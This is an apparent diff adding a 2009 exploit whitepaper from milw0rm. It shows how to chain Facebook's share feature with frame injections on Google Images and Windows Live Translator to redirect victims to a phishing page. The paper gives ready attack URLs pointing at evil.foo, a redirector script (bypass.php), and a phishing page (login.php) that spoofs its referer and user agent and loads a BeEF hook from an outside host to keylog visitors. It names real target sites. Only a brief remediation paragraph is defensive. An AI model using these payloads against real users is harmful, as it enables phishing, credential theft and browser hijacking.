@@ -1,0 +1,350 @@
+<html>
+<head>
+<title>From Legal Frame Injection to Illegal Redirect</title>
+<pre>
+ *******************************************************************************
+ *********************      p3Lo (thibaut.l) Presents      *********************
+ ******************************************************************************* 
+ *                                                                             * 
+ *  **** ****   *****   ***   **        **    ****** *******  *****  **        * 
+ *  **   *  ** **   ** **********       **    ****** *******  *   *  **        * 
+ *  **   *  ** *     * **  **  **       **    **     *        *   *  **        * 
+ *  ***  ****  *     * **  **  **       **    ****   *        *****  **        * 
+ *  **   * **  *     * **  **  **       **    **     *  ****  *   *  **        *
+ *  **   *  ** **   ** **      **       ***** ****** *     *  *   *  ******    *
+ *  **   *  **  *****  **      **       ***** ****** ******* **   ** ******    *
+ *                                                                             *
+ *                                                                             *
+ * **** ***    *   *     * *****    * *   * **** ****  *** ******  ***** **  * *
+ * *    *  *  * *  **   ** *        * **  *   *  *    *      *   * *   * **  * *
+ * *    *  * *   * * * * * *        * * * *   *  *    *      *   * *   * *** * *
+ * ***  ***  ***** *  *  * ****     * * * *   *  ***  *      *   * *   * * * * *
+ * *    * *  *   * *     * *        * * * * * *  *    *      *   * *   * * *** *
+ * *    *  * *   * *     * *        * *  ** * *  *    *      *   * *   * *  ** *
+ * *    *  * *   * *     * *****    * *  ** ***  ****  ***   *   * ***** *  ** *
+ *                                                                             *
+ *         ******** *****        ** *    *    **** ****  ***** *               *
+ *            **    **  *        ** *    *    *    *     *   * *               *
+ *            **    **  *        ** *    *    *    *     *   * *               *
+ *            **    **  *        ** *    *    ***  * *** ***** *               *
+ *            **    **  *        ** *    *    *    *  *  *   * *               *
+ *            **    **  *        ** *    *    *    *  *  *   * *               *
+ *            **    *****        ** **** **** **** ****  *   * *****           *
+ *                                                                             *
+ *      *******  ******  ****        ******  ******   *******  ********        *
+ *      *     *  ******  ******  **  *    *  ******   **   **  ********        *
+ *      *     *  *       **   *  **  *    *  *       **           **           *
+ *      *******  *       **   *  **  ******  *****   **           **           *
+ *      *******  ****    **   *  **  * **    *****   **           **           *
+ *      *  **    *       **   *  **  *  **   *       **           **           *
+ *      *   **   *       **   *  **  *   **  *       **           **           *
+ *      *    **  ******  ******  **  *   **  ******   **    *     **          **
+ **     *    **  ******  *****   **  *   **  ******   *******     **         ***
+ ***                                                                        ****
+ *****                                                                     *****
+ *******************************************************************************
+ *******************************************************************************
+ **********                                                           ********** 
+ ********                                                               ******** 
+ ****                                                                       **** 
+ *      *******   *****             ****     ****    ****   *******            *
+ *      *******  *******           *****    ******  ******  *******            *
+ *      *        **    *              **    *    *  *    *       **            *
+ *      *******  *     *              **         *       *       **            *
+ *            *  *     * *****        **      ****   *****    *******          *
+ *            *  *     * *****        **      ****   *****    *******          *
+ *            *  *     *              **         *       *       **            *
+ *      *     *  *     *              **         *       *       **            *
+ *      **   **  ***  **           *******  **  **  **  **       **            *
+ *       *****    *****            *******  ******  ******       **            *
+ *                                                                             *
+ *                       ****  *****  ****** *       *                         *
+ *                      **     *   *  *       *  *  *                          *
+ *                      *      *****  *****   *  *  *                          *
+ *                      *      * *    *        * * *                           *
+ *                      *****  *  *   ******   ** **                           *
+ *                                                                             *
+ *                                                                             *
+ *******************************************************************************
+      
+      
+       !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!                              
+       !  Author : p3Lo (Thibaut.L)                                  ! 
+       !  CreW : 50-1337                                             !
+       !  Subject : From &quot;legal&quot; frame injection to illegal redirects!
+       !  Vulnerable platforms: all browsers with GUI                !
+       !  Date : Thursday 12 February 2009                           !
+       !  Target: facebook.com,windowslivetranslator.com,Google.com  ! 
+       !  Mail: pelo[at]k[dot]st                                     !
+       !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!	  
+
+
+
+Disclamer:
+----------
+
+In this paper we will see how we can combine &quot;legal&quot; frame injection to succeed to a redirect vulnerability. This paper has been written for informational purpose, don't use it illegaly. I would be in no cases responsible of your acts further to the reading of this article.
+
+
+
+
+0) Sum up:
+---------
+
+1) Introduction
+2) Frame injection definition, explanation
+3) Description of the targeted url used as payload 
+4) Redirects a little description about the exploit
+5) Way of exploitation, combining redirect with frame injection vulnz
+6) Correct the vuln please !
+7) Linkz and Greetz
+
+
+Needed:
+-A web server with cURL enabled
+-Knowledge in php / js
+-A facebook account and friends to test the exploit
+-Beef (bindshell.net)
+-Frame injections and eyes to read it. 
+	
+
+	
+1) Introduction
+---------------
+	
+	Day  after days the web vulnerabilities are subjected to a constant evolution due to the diversity of the web programming langages. Mostly the targets first touched are the social network and the search engines because of their huge visits by days. That's why these website are compelled of applying the principle of responsible disclosure in order to protect their customers and avoid the abuse. 
+
+	
+	  
+	  
+	  
+2) Frame injection definition, explanation : 
+--------------------------------------------
+
+Definition:
+  A frame injection attack (on the web) is an attack who works on all GUI based browsers , it consist in load arbitrary code such as Javascript, VBScript (activeX), flash , AJAX (html+js+py). This happens when code gets injected through frames due to scripts not validating their input. 
+  
+(extract from pagvac - gnucitizen)  
+&lt;&lt; Frame injection vulnerabilities, although some people might consider them the same as HTML injection/XSS or even a subset, they really are not the same.
+
+Here is why:
+    * There is no need to inject special control characters such as angle brackets (unlike HTMLi/XSS)
+    * HTMLi/XSS filtering routines will not project against frame injection since the attacker only needs to insert a URL in the non-sanitized parameter
+
+The best way to explain what I mean is to show an example. Most frame injection issues occur in web applications because dynamic frameset/iframe insertion is not implemented with enough filtering. For instance, say that we have the following URL on the target site:
+
+https://www.victim.foo/index.php?targeturl=/contact.php
+
+A malicious user with intentions of launching a phishing attack will try tampering the targeturl parameter. His goal is to insert a third-party page that is under his control, rather than the original contact page. Indeed, index.php, although is not allowing HTML or JavaScript to be assigned to targeturl, is happy to process an absolute URL rather than a relative one:
+
+https://www.victim.foo/index.php?targeturl=http://evil.foo/login.php   &gt;&gt;
+ 
+Note : The attacker can encode the malicious pishing link to hex values, we didn't use that on this paper.
+
+
+
+
+3) Description of the targeted url used as payload :
+-------------------------------------------------------------------
+
+This technique will work only if the victim contact has added you to his friend list and if the facebook session cookie is stored by your browser.The legal frame injection on facebook consist to input an url on the page named sharer.php.In facebook you can see if a contact is online or not when you accept him as friend or if his profile is public. A malicious attacker will try to add you to gain information about you. In facebook i advice you to dont allow every untrusted contact to add you because he can try to hack you account like sending to you a malicious link.
+
+How this attack can work ?
+
+Here is a little example of the code that facebook can use to protect the &quot;legal&quot; link injected on facebook.com/sharer.php  
+
+
+                                                             
+                                                                        
+                       Enter the url that you want to share.            
+                     /--------------------------------------\ /------\ 
+                     |http://                               | |share |  
+                     \--------------------------------------/ \------/  
+                                                                        
+                                                                        													
+
+Using of google	or live search frame injection as payload to our attack:
+
+ Now lets use our malicious brain to hijack this.
+The &quot;legal&quot; frame injection that we used will be on a &quot;trusted&quot; website ,the victim has to trust the link sended by you on your profile thats why google or livesearch are welcome for this attack.
+
+The source code of bypass.php is my malicious redirector script, it will be explained later in the paper.
+
+Google image frame injection
+http://www.google.fr/imgres?imgurl=http://fake_url&amp;imgrefurl=http://evil.foo/bypass.php
+
+Or
+
+Windows live translator frame injection
+http://www.windowslivetranslator.com/BV.aspx?ref=Internal#http://www.windowslivetranslator.com/bv.aspx?mkt=fr-FR&amp;dl=fr&amp;lp=en_fr&amp;a=http://evil.foo/bypass.php
+
+
+
+
+4) Redirect the little description :
+-----------------------------------
+
+The redirect vulnerability allows an evil-minded user of redirecting a victim towards a site which is aimed at harming the users. The principal attack vector of this vulnerability is the pishing. The redirect vulnerability can be associated with a malicious script written in php, javascript, vbscript ,ajax (worm) only with remote web server privileges.
+
+The most common attack vector is manifested by the presence of a double url in the attack:
+http://site.com/redirect?r=http://malicious_website.com
+
+I invite you to see the facebook redirect exploit video on my website (p3lo.lescigales.org/wp/).
+ 
+See the example picture:
+
+
+
+ 
+ 
+5) Way of exploitation, combining redirect with frame injection vulnz:
+----------------------------------------------------------------------
+
+Example of advanced redirect and frame injection combo attack:                                             
+                                                                              
+ /-----------/  /-----------/  /-----------/   /-----------/  /-----------/   
+ |facebook   ---| google    ---| bypass.php|---| login.php ---| b e e f  :    
+ \-----------\  \-----------\  \-----------\   \-----------\  \-----------\                   
+
+
+The facebook sharer.php input source might looks like this script: 
+
+
+#########################################################################
+&lt;!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN&quot; 
+&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt; 
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt; 
+&lt;html&gt; 
+&lt;head&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
+&lt;title&gt; Welcome in my-site-is-not-secure-now.w00t&lt;/title&gt; 
+&lt;/head&gt; 
+&lt;frameset rows=&quot;*&quot; cols=&quot;110,*&quot; frameborder=&quot;NO&quot; border=&quot;0&quot; framespacing=&quot;0&quot;&gt; 
+  &lt;frame src=&quot;navigation.htm&quot; name=&quot;navigation&quot; frameborder=&quot;yes&quot; scrolling=&quot;&quot;NO&quot; 
+bordercolor=&quot;#0000CC&quot; id=&quot;navigation&quot;&gt; 
+  &lt;frameset rows=&quot;98,*&quot; cols=&quot;*&quot; framespacing=&quot;0&quot; frameborder=&quot;NO&quot; border=&quot;0&quot; &gt; 
+    &lt;frame src=&quot;en_tete.htm&quot; name=&quot;en-tete&quot; frameborder=&quot;yes&quot; scrolling=&quot;NO&quot; 
+bordercolor=&quot;#000000&quot; id=&quot;en-tete&quot;&gt; 
+    &lt;frame  src=&quot;&lt;?php 
+  //secure code 
+  if(isset($_GET['iframe'])) 
+      { 
+$allowUrls = array(&quot;http://www.google.fr/imgres?imgurl=http://fake_url&amp;imgrefurl=http://evil.foo/bypass.php&quot;);  
+//^^^^^^^^^^^^sharer.php allowed links here 
+   
+        if(in_array($_GET['iframe'], $allowUrls)) 
+        echo $_GET['iframe']; //if iframe have an url allowed 
+        else // for show the main page (or an error page) 
+        echo &quot;accueil.htm&quot;; 
+  } 
+  else // !!! 
+    echo &quot;accueil.htm&quot;; 
+?&gt;&quot; name=&quot;corps&quot; scrolling=&quot;auto&quot; id=&quot;corps&quot;&gt; 
+  &lt;/frameset&gt; 
+&lt;/frameset&gt;&lt;noframes&gt;No frames :(&lt;/noframes&gt; 
+&lt;/html&gt; 
+#########################################################################
+
+
+
+The facebook change the malicious url to a clean link like (the 501337 Crew p3lo are the generated values, letters and numbers by the sharer.php script): 
+
+http://www.facebook.com/ext/share.php?sid=501337&amp;h=Crew&amp;u=p3lo
+
+
+And the link on the facebook profile appeared like this:
+
+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; 
+Results of image search
+ 
+http://www.google.fr/imgres?imgurl=http://fake_url... 
+&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
+
+
+
+Now lets look around the PoC of my redirector script (bypass.php):
+###########################################################################
+ &lt;head&gt;                                                                                            
+                                                                                                   
+ &lt;meta http-equiv=&quot;Content-Language&quot; content=&quot;it&quot;&gt;                                                 
+ &lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;                                                                    
+ if (top.frames.length!=0) top.location=self.document.location;                                    
+ &lt;/SCRIPT&gt;                                                                                         
+ &lt;title&gt;fb redirector PoC by p3lo&lt;/title&gt;                                                          
+                                                                                                   
+ &lt;/head&gt;                                                                                           
+                                                                                                   
+                                                                                                   
+                                                                                                   
+ &lt;body bgcolor=&quot;#99FF66&quot;&gt;                                                                          
+                                                                                                   
+The first script contained in the head permit to kill the first frame of my payload url redirecting it to self.document.location .
+The second script permit to redirect my page to an advanced pishing page (keylogged with beef bindshell.net) 
+ 
+ .p3lo                                                                                             
+                                                                                                   
+ &lt;br&gt;                                                                                              
+                                                                                                   
+ &lt;br&gt;&lt;br&gt;                                                                                          
+                                                                                                   
+ &lt;/body&gt;                                                                                           
+                                                                                                   
+ &lt;br&gt;&lt;br&gt;&lt;script&gt;document.location=&quot;http://evil.foo/login.php&quot;;&lt;/script&gt;&lt;br&gt;    
+###############################################################################                                                       
+ 
+This is the source of the advanced redirect pishing page (login.php):
+
+############################################################################### 
+&lt;?php
+//by p3lo
+//this is how to send a get request with cURL (your server have to be cURL enabled)
+
+//spoofing referer
+$referer=”http://www.facebook.com/”;
+// spoofing FireFox 2.0
+$useragent=”Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1?;
+$ch = curl_init();
+
+curl_setopt ($ch, CURLOPT_URL, &quot;http://www.facebook.com/&quot;);
+curl_setopt ($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_REFERER, $referer);
+
+curl_exec ($ch);
+
+curl_close ($ch);
+?&gt;
+&lt;script src=”http://beefsite/beef/hook/beefmagic.js.php”&gt;&lt;/script&gt;   // &lt;——-beef on my scampage page
+############################################################################### 
+
+
+
+
+
+6) Correct the vuln please :
+----------------------------
+
+After a long moment of research, i think that the best way to correct these vulnerabilities is to assure the user that he leave the page and the website domain. A redirection page to ensure his choice is the best way to warn the user of the possibles threats against him.
+I hope you have taken pleasure to read my whitepaper.
+
+
+
+
+7) Linkz and Greetz :
+---------------------
+
+Links concerning this article:
+- http://p3lo.lescigales.org/wp
+- http://www.gnucitizen.org/blog/frame-injection-fun/
+- http://bindshell.net/
+
+
+Greetz
+Str0ke . Mike001 . Devil . Noxo . MySt3ri0us . xxello . t0fx . AzOTe . Funny . scarface-team . Xylitol . Z3Q3ul . asylu3 . 0ni . KPCR . Sh0ck . Nasty Shade . TheCrow . HuG . Hug88 . Ez3kiEl . tr00ps . £lectricdr3ke . stivon . Faworis . emuleman . RF . White Angels . Miss Narkotik . p@@@ . Akxos/Freiya . Odysse . Tavux . v00d00chile . mrabah12 . Big.E . Benjilen00b .SoLiTaIr3 
+
+CreWz : 50-1337 CreW . CWH Underground . Scarface Team . Team Sakage . 
+Special Tapz: Yehouda,dimtokill,blueninja,nico,snoop,trika,sakage team,ooyep,freeman  
+Sites: p3lo.lescigales.org/wp/,forum.europasecurity.org,citec.us,xssed.org,Zataz.com     
+
+# milw0rm.com [2009-02-12]</pre>
+</html>
